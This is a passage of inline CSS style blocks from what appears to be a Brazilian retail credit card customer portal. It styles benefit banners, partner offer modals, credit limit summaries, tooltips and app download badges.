         .banner-beneficios-exclusivos__title {
         line-height: 32px;
         font-size: 22px; }
         .banner-beneficios-exclusivos__title svg {
         height: 18px; }
         .banner-beneficios-exclusivos__content {
         margin: 0 20px;
         max-width: initial; }
         .banner-beneficios-exclusivos__cartao {
         margin-left: 20px;
         width: auto;
         height: 100px; }
         .banner-beneficios-exclusivos__separator {
         display: none; }
         .safari .banner-beneficios-exclusivos {
         background-image: url(../images/modelo-banner.png); } }
      </style>
      <style type="text/css">.meu-cartao .banner-conferir-beneficios {
         display: -webkit-box;
         display: flex; }
         .banner-conferir-beneficios {
         display: none;
         margin-top: 20px;
         border: 3px solid #ac8947;
         background-image: -webkit-gradient(linear, left top, left bottom, from(transparent), color-stop(20%, transparent), color-stop(50%, white)), url(../vectors/bg-login.svg);
         background-image: linear-gradient(to bottom, transparent, transparent 20%, white 50%), url(../vectors/bg-login.svg);
         background-size: 40px;
         cursor: pointer;
         padding: 0 15px 0 10px;
         text-decoration: none;
         color: #706f6f; }
         .banner-conferir-beneficios p {
         line-height: 16px; }
         .banner-conferir-beneficios__flag svg {
         width: 50px;
         height: 50px; }
         .banner-conferir-beneficios__content {
         margin: 20px 0 4px 10px; }
         .banner-conferir-beneficios__description {
         font-size: 14px; }
         .banner-conferir-beneficios__meu-cartao-icon svg {
         display: inline;
         width: 80px;
         height: 17px; }
         .banner-conferir-beneficios__highlight-text {
         color: #ac8947; }
         .banner-conferir-beneficios:hover {
         color: #706f6f; }
         .banner-conferir-beneficios:hover .banner-conferir-beneficios__highlight-text {
         text-decoration: underline; }
         .safari .banner-conferir-beneficios {
         background: none; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed, .cartao-renner .banner-informativo-beneficios__ver-todos button.button.button--outline:hover, .banner-informativo-beneficios__ver-todos .cartao-renner button.button.button--outline:hover,
         .meu-cartao .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .banner-informativo-beneficios__ver-todos button.button.button--outline:hover,
         .banner-informativo-beneficios__ver-todos .meu-cartao .cartao-renner button.button.button--outline:hover {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed, .cartao-renner.theme-priority .banner-informativo-beneficios__ver-todos button.button.button--outline:hover, .banner-informativo-beneficios__ver-todos .cartao-renner.theme-priority button.button.button--outline:hover {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed, .meu-cartao .banner-informativo-beneficios__ver-todos button.button.button--outline:hover, .banner-informativo-beneficios__ver-todos .meu-cartao button.button.button--outline:hover,
         .cartao-renner .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .banner-informativo-beneficios__ver-todos button.button.button--outline:hover,
         .banner-informativo-beneficios__ver-todos .cartao-renner .meu-cartao button.button.button--outline:hover {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed, .meu-cartao.theme-priority .banner-informativo-beneficios__ver-todos button.button.button--outline:hover, .banner-informativo-beneficios__ver-todos .meu-cartao.theme-priority button.button.button--outline:hover {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .banner-informativo-beneficios {
         margin-top: 70px; }
         .banner-informativo-beneficios p {
         margin-bottom: 0; }
         .banner-informativo-beneficios__icon, .banner-informativo-beneficios__icon--item, .banner-informativo-beneficios__icon--ver-todos {
         border-radius: 100%;
         padding: 16px;
         width: 70px;
         min-width: 70px;
         height: 70px; }
         .banner-informativo-beneficios__icon--item {
         background: rgba(172, 137, 71, 0.15);
         color: #ac8947; }
         .banner-informativo-beneficios__icon--ver-todos {
         background: rgba(0, 0, 0, 0.1);
         color: white; }
         .banner-informativo-beneficios__itens {
         display: -webkit-box;
         display: flex;
         position: relative;
         background-color: #f2f2f2;
         padding: 10px 20px;
         overflow: hidden;
         color: #706f6f; }
         .banner-informativo-beneficios__itens:before {
         position: absolute;
         top: -80px;
         right: -130px;
         -webkit-transform: rotate(-130deg);
         transform: rotate(-130deg);
         background-color: #f2f2f2;
         background-image: url(../vectors/bg-login.svg);
         background-size: 60px;
         width: 250px;
         height: 200px;
         content: "";
         background-blend-mode: multiply; }
         .banner-informativo-beneficios__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: column;
         z-index: 1;
         margin: 20px;
         width: 100%;
         text-align: center; }
         .banner-informativo-beneficios__item__description {
         max-width: 100%; }
         .banner-informativo-beneficios__ver-todos {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         background: #ac8947;
         padding: 30px;
         color: white; }
         .banner-informativo-beneficios__ver-todos--mobile {
         display: none; }
         .banner-informativo-beneficios__ver-todos h3 {
         margin-top: 0; }
         .banner-informativo-beneficios__ver-todos__content {
         margin-right: 30px;
         margin-left: 20px; }
         .banner-informativo-beneficios__ver-todos__button-container {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         width: 100%; }
         .banner-informativo-beneficios__ver-todos loader {
         width: 70%; }
         .banner-informativo-beneficios__ver-todos loader .loader {
         width: 100%; }
         .banner-informativo-beneficios__ver-todos button.button.button--outline {
         border-color: #fff;
         background-color: transparent;
         width: 100%;
         color: white; }
         .banner-informativo-beneficios__ver-todos button.button.button--outline:hover {
         border-color: white;
         background-color: white; }
         :not(.loader--show) .meu-cartao .banner-informativo-beneficios__button.button.button--outline[disabled] {
         background-color: transparent; }
         :not(.loader--show) .meu-cartao .banner-informativo-beneficios__button.button.button--outline[disabled]:hover {
         background-color: transparent; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .banner-informativo-beneficios p {
         font-size: 12px; }
         .banner-informativo-beneficios h3 {
         font-size: 14px;
         font-weight: 700; }
         .banner-informativo-beneficios__itens {
         padding: 10px; }
         .banner-informativo-beneficios__itens:before {
         top: -10px;
         right: -120px;
         background-size: 40px;
         width: 200px;
         height: 100px; }
         .banner-informativo-beneficios__item {
         margin: 10px; }
         .banner-informativo-beneficios__ver-todos {
         padding: 20px; }
         .banner-informativo-beneficios__ver-todos__content {
         margin-right: 20px;
         margin-left: 10px; }
         .banner-informativo-beneficios__ver-todos button.button.button--outline {
         min-width: 162px;
         height: 40px;
         line-height: 40px;
         font-size: 12px; } }
         @media (max-width: 767px) {
         .banner-informativo-beneficios {
         margin-top: 24px; }
         .banner-informativo-beneficios h3 {
         display: inline; }
         .banner-informativo-beneficios__icon, .banner-informativo-beneficios__icon--item, .banner-informativo-beneficios__icon--ver-todos {
         padding: 10px;
         width: 47px;
         min-width: 47px;
         height: 47px; }
         .banner-informativo-beneficios__itens {
         flex-wrap: wrap;
         padding: 0;
         padding-top: 10px; }
         .banner-informativo-beneficios__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: inherit;
         -webkit-box-pack: start;
         justify-content: flex-start;
         text-align: left; }
         .banner-informativo-beneficios__item__title {
         margin-left: 12px; }
         .banner-informativo-beneficios__ver-todos {
         display: none;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: inherit;
         flex-wrap: wrap;
         padding: 20px; }
         .banner-informativo-beneficios__ver-todos--mobile {
         display: -webkit-box;
         display: flex; }
         .banner-informativo-beneficios__ver-todos--mobile loader {
         width: 100%; }
         .banner-informativo-beneficios__ver-todos--mobile loader .loader {
         margin-top: 20px;
         width: 100%; }
         .banner-informativo-beneficios__ver-todos--mobile button.button.button--outline {
         width: 100%; }
         .banner-informativo-beneficios__ver-todos__title {
         display: -webkit-box;
         display: flex;
         align-content: center;
         -webkit-box-pack: center;
         justify-content: center; }
         .banner-informativo-beneficios__ver-todos__title h3 {
         margin-left: 12px; } }
         .ie .banner-informativo-beneficios__itens:before,
         .edge .banner-informativo-beneficios__itens:before {
         content: none; }
      </style>
      <style type="text/css">.modal-parceiros--camicado.modal-parceiros .modal__content {
         border-color: #b2101f; }
         .modal-parceiros--camicado.modal-parceiros .modal-parceiros__header {
         background: #b2101f; }
         .modal-parceiros--camicado.modal-parceiros .modal-parceiros__icon {
         width: 416px; }
         .modal-parceiros--nespresso.modal-parceiros .modal__content {
         border-color: #000; }
         .modal-parceiros--nespresso.modal-parceiros .modal-parceiros__header {
         background: #000; }
         .modal-parceiros--cobasi.modal-parceiros .modal__content {
         border-color: #0097a8; }
         .modal-parceiros--cobasi.modal-parceiros .modal-parceiros__header {
         background: #0097a8; }
         .modal-parceiros--lenovo.modal-parceiros .modal__content {
         border-color: #e1140a; }
         .modal-parceiros--lenovo.modal-parceiros .modal-parceiros__header {
         background: #e1140a; }
         .modal-parceiros--panvel.modal-parceiros .modal__content {
         border-color: #1a2674; }
         .modal-parceiros--panvel.modal-parceiros .modal-parceiros__header {
         border-bottom: 1px solid #e0e0e0;
         padding: 20px; }
         .modal-parceiros--renner.modal-parceiros .modal__content {
         border-color: #eb3630; }
         .modal-parceiros--renner.modal-parceiros .modal-parceiros__header {
         background: #eb3630; }
         .modal-parceiros--renner.modal-parceiros .modal-parceiros__icon {
         width: 298px; }
         .modal-parceiros--reppara.modal-parceiros .modal__content {
         border-color: #50d5ca; }
         .modal-parceiros--reppara.modal-parceiros .modal-parceiros__header {
         border-bottom: 1px solid #e0e0e0; }
         .modal-parceiros--youcom.modal-parceiros .modal__content {
         border-color: #1d1d1b; }
         .modal-parceiros--youcom.modal-parceiros .modal-parceiros__header {
         background: #1d1d1b; }
         .modal-parceiros--youcom.modal-parceiros .modal-parceiros__icon {
         width: 335px; }
         .modal-parceiros .modal__content {
         margin-top: 148px;
         margin-bottom: 0;
         border-bottom: 20px solid #fff;
         padding: 0 40px 50px;
         max-height: calc(100vh - 240px);
         overflow: scroll;
         overflow-x: hidden; }
         .modal-parceiros ul {
         list-style: none; }
         .modal-parceiros li:before {
         margin-right: 4px;
         color: #ac8947;
         font-weight: 900;
         content: "-"; }
         .modal-parceiros.modal {
         padding: 0; }
         .modal-parceiros h2 {
         font-weight: 900; }
         .modal-parceiros a {
         word-break: break-all;
         color: #ac8947; }
         .modal-parceiros__header {
         display: -webkit-box;
         display: flex;
         position: absolute;
         top: 0;
         left: 0;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         width: 100%;
         height: 148px; }
         .modal-parceiros__footer-text {
         text-align: center; }
         .modal-parceiros__footer-text p {
         margin: 0; }
         .modal-parceiros__separator:after {
         display: block;
         bottom: 0;
         background: #ac8947;
         width: 20px;
         height: 3px;
         content: ""; }
         .modal-parceiros p.modal-parceiros__separator:after {
         margin-top: 16px; }
         @media (max-width: 767px) {
         .modal-parceiros .modal__content {
         margin-top: 90px;
         font-size: 12px; }
         .modal-parceiros h2 {
         font-size: 14px; }
         .modal-parceiros__header {
         height: 90px; }
         .modal-parceiros__header img {
         width: auto;
         height: 90%; } }
         /* width */
         #scroll-modal-parceiros::-webkit-scrollbar {
         margin: 10px;
         padding: 10px;
         width: 15px;
         height: 25px; }
         /* Track */
         #scroll-modal-parceiros::-webkit-scrollbar-track {
         background: transparent; }
         /* Handle */
         #scroll-modal-parceiros::-webkit-scrollbar-thumb {
         border: 5px solid transparent;
         border-radius: 20px;
         background: rgba(30, 30, 31, 0.4);
         background-clip: content-box; }
         /* Handle on hover */
         #scroll-modal-parceiros::-webkit-scrollbar-thumb:hover {
         background-color: rgba(30, 30, 31, 0.6); }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         @media (max-width: 767px) {
         .parceiros {
         margin-top: -10px;
         margin-left: -10px;
         width: 100vw; } }
         .outras-ofertas {
         background: #f2f2f2;
         padding: 50px 20px; }
         .outras-ofertas h2 {
         min-width: 210px;
         line-height: 36px;
         color: #ac8947;
         font-size: 32px;
         font-weight: 900; }
         .outras-ofertas__content {
         display: -webkit-box;
         display: flex; }
         .outras-ofertas__ofertas {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap; }
         .outras-ofertas__oferta {
         cursor: pointer;
         padding: 10px 14px;
         width: 33%; }
         .outras-ofertas__oferta__text {
         max-width: 100%; }
         .outras-ofertas__oferta__content {
         box-sizing: border-box;
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: column;
         justify-content: space-around;
         box-shadow: 0 1px 3px rgba(172, 172, 172, 0.2), 0 3px 4px rgba(172, 172, 172, 0.14), 0 1px 8px rgba(172, 172, 172, 0.12);
         background: white;
         padding: 12px 16px;
         height: 100%;
         text-align: center;
         line-height: 20px;
         color: #706f6f;
         font-size: 14px; }
         .outras-ofertas__oferta__content img {
         padding: 0 4px;
         max-height: 52px; }
         .outras-ofertas__oferta p {
         margin: 10px 0 0; }
         @media (max-width: 1023px) {
         .outras-ofertas {
         padding: 30px 0; }
         .outras-ofertas h2 {
         margin: 6px 0 12px;
         font-size: 20px; }
         .outras-ofertas__content {
         display: block; }
         .outras-ofertas__ofertas {
         padding: 0 13px; }
         .outras-ofertas__oferta {
         padding: 7px; }
         .outras-ofertas__oferta__content {
         font-size: 12px; } }
         @media (max-width: 767px) {
         .outras-ofertas {
         padding: 30px 13px; }
         .outras-ofertas__separator,
         .outras-ofertas h2 {
         display: block;
         margin-left: 7px; }
         .outras-ofertas__ofertas {
         padding: 0; }
         .outras-ofertas__oferta {
         width: 50%; } }
      </style>
      <style type="text/css">@media (max-width: 767px) {
         .parceiros {
         margin-top: -10px;
         margin-left: -10px;
         width: 100vw; } }
      </style>
      <style type="text/css">.ver-todos-beneficios {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: column;
         padding: 30px 20px;
         color: #706f6f; }
         .ver-todos-beneficios button.button {
         width: 270px; }
      </style>
      <style type="text/css">.resumo__utilizado-adicional .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .resumo__utilizado-adicional .block__header .tooltip--left {
         top: 50%;
         right: auto;
         left: auto; }
         .resumo__utilizado-adicional .block__header .tooltip--left .tooltip__box {
         margin-top: -5px;
         padding: 10px; }
         .resumo__utilizado-adicional .block__header .tooltip--left .tooltip__box-content {
         width: 250px; }
         .resumo__utilizado-adicional .block__header .tooltip--left p {
         margin-bottom: 0; }
         .resumo__utilizado-adicional .block__content {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-top: 30px; }
         .resumo__utilizado-adicional .block__adicional {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name,
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         width: 30%;
         color: #acacac;
         font-size: 14px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin: 0 10px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name {
         overflow: hidden;
         text-overflow: ellipsis;
         white-space: nowrap; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite-utilizado {
         color: #706f6f; }
         @media (max-width: 767px) {
         .resumo__utilizado-adicional .block__header .tooltip-wrapper {
         display: inline-block;
         position: relative; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .block__header-tooltip {
         position: absolute;
         top: 15px;
         left: 210px; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .tooltip__box .tooltip__box-link {
         width: 13px;
         height: 13px; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .tooltip__box .tooltip__box-content {
         top: 38px; }
         .resumo__utilizado-adicional .block__header-text {
         line-height: 1; }
         .resumo__utilizado-adicional .block__header-tooltip {
         z-index: 2; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content {
         top: 38px;
         left: -187px;
         width: 200px; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content:after {
         right: auto;
         left: 7px; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content:before {
         right: auto;
         left: 5px; }
         .resumo__utilizado-adicional .block__adicional {
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name,
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         width: 50%;
         font-size: 12px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name {
         color: #706f6f; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         text-align: right;
         color: #acacac; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart {
         -webkit-box-flex: inherit;
         flex-grow: inherit;
         -webkit-box-ordinal-group: 4;
         order: 3;
         margin: 5px 0 15px;
         width: 100%; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart .linear-chart .chart__bar,
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart .linear-chart .chart__fill {
         height: 8px; } }
         .resumo__limite-adicionais .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .resumo__limite-adicionais .block__header .tooltip--left {
         top: 50%;
         right: auto;
         left: auto; }
         .resumo__limite-adicionais .block__header .tooltip--left .tooltip__box {
         margin-top: -6px;
         padding: 10px; }
         .resumo__limite-adicionais .block__header .tooltip--left .tooltip__box-content {
         width: 250px; }
         .resumo__limite-adicionais .block__header .tooltip--left p {
         margin-bottom: 0; }
         .resumo__limite-adicionais .block__content {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-top: 30px; }
         .resumo__limite-adicionais .block__adicionais {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap; }
         .resumo__limite-adicionais .block__adicionais .block__adicional {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin: 5px 0;
         padding: 0 10px 0 5px;
         width: 100%; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label,
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__value {
         white-space: nowrap;
         font-size: 16px; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label {
         padding-right: 10px;
         overflow: hidden;
         text-overflow: ellipsis; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__subtitle {
         display: none; }
         .resumo__limite-adicionais .block__adicionais .block__adicional-icon {
         display: inline-block;
         margin-right: 13px;
         width: 14px;
         height: 14px; }
         .resumo__limite-adicionais .meu-cartao .block__tooltip {
         background-color: #ac8947; }
         .resumo__limite-adicionais .cartao-renner .block__tooltip {
         background-color: #d71920; }
         @media (max-width: 767px) {
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label,
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__value {
         font-size: 14px; }
         .resumo__limite-adicionais .block__adicionais .block__adicional-name {
         font-size: 12px; }
         .resumo__limite-adicionais .block__header .block__header-title {
         position: relative; }
         .resumo__limite-adicionais .block__header .block__header-title .block__header-tooltip {
         position: absolute;
         z-index: 2;
         margin: 5px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content {
         top: 40px;
         left: -193px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content:after {
         left: auto;
         left: 192px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content:before {
         left: auto;
         left: 190px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box {
         padding-left: 4px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box .tooltip__box-link {
         width: 13px;
         height: 13px; }
         .resumo__limite-adicionais .block__header-text {
         line-height: 1; }
         .resumo__limite-adicionais .block__header-tooltip .tooltip__box-content {
         width: 200px; } }
         .resumo-limites__paginacao {
         display: -webkit-box;
         display: flex;
         position: absolute;
         top: 20px;
         right: 20px;
         -webkit-box-align: center;
         align-items: center;
         color: #706f6f; }
         .resumo-limites__paginacao .paginacao__text {
         margin: 0 10px; }
         .resumo-limites__paginacao .paginacao__button {
         cursor: pointer; }
         .resumo-limites__paginacao .paginacao__button:disabled {
         cursor: inherit;
         color: #acacac; }
         .resumo-limites__paginacao .paginacao__button:focus {
         outline: none; }
         .resumo-limites__paginacao .paginacao__button span {
         display: block;
         width: 30px;
         height: 30px; }
         .resumo-limites__publicidade {
         width: 320px; }
         .resumo-limites .scroll__adicionais {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         flex-wrap: nowrap;
         height: 246px;
         overflow-x: hidden;
         overflow-y: scroll;
         -ms-overflow-style: none; }
         .resumo-limites .scroll__adicionais::-webkit-scrollbar {
         display: none; }
         .btn_visibility-off {
         display: none; }
         .btn_icon_visibility-on svg {
         margin-left: 10px;
         left: 0;
         width: 35px;
         height: auto; }
         .btn_icon_visibility-off svg {
         margin-left: 10px;
         left: 0;
         width: 35px;
         height: auto; }
         .none {
         color: lightgray; }
         .stripe {
         background-color: #E0E0E0;
         color: #E0E0E0;
         border-radius: 15px;
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none;
         padding: 0px 2px 0px 2px; }
         .align_title {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between;
         -webkit-box-align: center;
         align-items: center; }
         .align_visibility {
         -webkit-transform: translateY(-8%);
         transform: translateY(-8%);
         margin-bottom: -10px; }
         .tooltip-bottom {
         display: none; }
         .block__tooltip {
         position: absolute;
         bottom: 0;
         left: 5px; }
         @media (max-width: 767px) {
         .resumo-limites .columns {
         width: 100%; }
         .resumo-limites__paginacao {
         top: 12px;
         right: 10px; }
         .resumo-limites__paginacao .paginacao__text {
         margin: 0 5px; }
         .resumo-limites__paginacao .paginacao__button span {
         width: 20px;
         height: 20px; }
         .resumo-limites .not-only-child {
         -webkit-box-flex: 0;
         flex: 0 0 300px; }
         .resumo-limites .panel .panel__cell:not(:only-child):not(:last-child):not(.panel_cell--full-width),
         .resumo-limites .panel .panel__cell:not(:only-child):not(:first-child) {
         border: 1px solid #e0e0e0;
         border-radius: 3px; }
         .resumo-limites .panel .panel__cell:not(:only-child):not(:first-child) {
         margin-left: 10px; }
         .resumo-limites .scroll {
         display: -webkit-box;
         display: flex;
         flex-wrap: nowrap;
         width: 100%;
         overflow-x: scroll;
         overflow-y: hidden;
         -ms-overflow-style: none; }
         .resumo-limites .scroll::-webkit-scrollbar {
         display: none; }
         .resumo-limites .resumo__limite-saque {
         margin-bottom: 0.625rem; }
         .resumo-limites .align_value {
         font-size: 12px;
         display: -webkit-inline-box;
         display: inline-flex;
         -webkit-transform: translateY(-20%);
         transform: translateY(-20%);
         padding-right: 20px; }
         .button-visibility {
         display: none; }
         .btn_visibility-off, .btn_visibility-off svg rect {
         display: inline; }
         .tooltip-top {
         display: none; }
         .tooltip-bottom {
         display: inline-block; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .resumo-limites .panel .panel__cell:not(:only-child):not(:last-child):not(.panel_cell--full-width),
         .resumo-limites .panel .panel__cell:not(:only-child):not(:first-child) {
         border: 1px solid #e0e0e0;
         border-radius: 3px; } }
         .resumo .texto-descritivo-divida .block__header-title {
         color: #1e1e1f; }
         .resumo .texto-descritivo-divida .block__header-title .block__header-text {
         padding-left: 0; }
         .resumo .mensagem-informativa {
         margin-bottom: 1.875rem; }
         .app-download {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         height: 100%; }
         .app-download__ad {
         flex-shrink: auto; }
         .app-download__ad img {
         width: 320px;
         height: 140px; }
         .app-download__badges {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-flex: 1;
         flex: 1;
         -webkit-box-pack: center;
         justify-content: center;
         background-color: #ebebeb; }
         .app-download__badges .badge-app-store {
         margin-right: 15px; }
         .badge-google-play img {
         display: block;
         width: auto;
         height: 35px;
         vertical-align: inherit !important; }
         .resumo-limite--error-container {
         margin: 0 auto; }
         .property--limites .property .property__label {
         letter-spacing: -0.02em;
         color: #706f6f;
         font-size: 14px; }
         .property--limites .property .property__value {
         letter-spacing: -0.02em;
         color: #706f6f;
         font-size: 16px; }
         .limite-compra .aviso-bloqueio {
         position: relative;
         margin-top: 15px; }
         .limite-compra .aviso-bloqueio loader .loader__invisibility-cloak {
         min-height: 30px; }
         .limite-compra .aviso-bloqueio .property--highlight.bloqueado .property .property__value {
         color: #cf3e3e; }
         .limite-compra .aviso-bloqueio .texto-tooltip {
         margin-bottom: 0;
         color: #706f6f;
         font-size: 12px; }
         .limite-compra .aviso-bloqueio .tooltip__box {
         position: absolute;
         top: 6px;
         left: -25px;
         color: #cf3e3e; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content {
         width: 380px; }
         .row-superior .property--highlight {
         margin-bottom: 0; }
         .property--highlight {
         display: block; }
         .property--highlight .property .property__value {
         color: #3ecf7a; }
         .limite-detalhe {
         margin: 0; }
         .limite-detalhe .limite-detalhe__item {
         position: relative;
         list-style: none;
         letter-spacing: -0.02em;
         color: #706f6f; }
         .limite-detalhe .limite-detalhe__item:before {
         display: inline-block;
         position: absolute;
         top: 2px;
         left: 0;
         border-left: 1px solid #acacac;
         height: 100%;
         content: ""; }
         .limite-detalhe .limite-detalhe__item:last-child:before {
         height: 50%; }
         .limite-detalhe .limite-detalhe__item.limite-detalhe__item--hightlight .limite-detalhe__item-value:after {
         background-color: #ebebeb; }
         .limite-detalhe .limite-detalhe__item-value {
         position: relative;
         padding-left: 30px;
         font-size: 12px;
         font-weight: 700; }
         .limite-detalhe .limite-detalhe__item-value:before, .limite-detalhe .limite-detalhe__item-value:after {
         position: absolute;
         content: ""; }
         .limite-detalhe .limite-detalhe__item-value:before {
         top: 7px;
         left: 0;
         border-bottom: 1px solid #acacac;
         width: 16px; }
         .limite-detalhe .limite-detalhe__item-value:after {
         top: 2px;
         left: 16px;
         border-radius: 50%;
         background-color: #acacac;
         width: 10px;
         height: 10px; }
         .limite-detalhe .limite-detalhe__item-label {
         font-size: 10px;
         font-weight: 300; }
         @media (max-width: 767px) {
         .block__content--limite-compra .circular-chart {
         width: auto; }
         .row-superior .property--highlight {
         margin-bottom: 15px; }
         .row-inferior {
         -webkit-box-orient: vertical;
         -webkit-box-direction: reverse;
         flex-direction: column-reverse; }
         .limite-compra .aviso-bloqueio .tooltip__box {
         top: 3px;
         left: -35px; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-link {
         width: 16px;
         height: 16px; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content {
         top: -110px;
         left: -98px;
         width: 300px; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content:before {
         top: initial;
         right: 171px;
         bottom: -10px;
         -webkit-transform: rotate(180deg);
         transform: rotate(180deg); }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content:after {
         top: initial;
         right: 173px;
         bottom: -22px;
         -webkit-transform: rotate(180deg);
         transform: rotate(180deg); } }
         @media (min-width: 768px) {
         .resumo .banner-conferir-beneficios {
         display: none; } }
